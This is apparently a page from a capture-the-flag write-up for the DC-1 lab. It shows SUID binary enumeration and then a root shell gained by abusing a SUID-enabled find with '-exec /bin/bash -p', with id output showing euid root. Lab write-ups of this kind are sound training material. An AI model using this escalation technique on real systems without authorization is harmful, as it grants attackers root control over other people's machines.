---
layout: default
title: Find
parent: SUID
nav_order: 5
---

# Find

---

## Check SUID File Permissions

```bash
www-data@DC-1:/var/www/sites/default$ find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

The _/usr/bin/find_ binary should give us a root shell.

![gtfobins](../../../../assets/images/ctfs/proving_grounds/dc-1/gtfobins.png)

We want to run _/usr/bin/find_ on a file we have read permissions on, such as _flag4.txt_

```bash
www-data@DC-1:/home/flag4$ /usr/bin/find flag4.txt -exec /bin/bash -p \; -quit
bash-4.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)

```
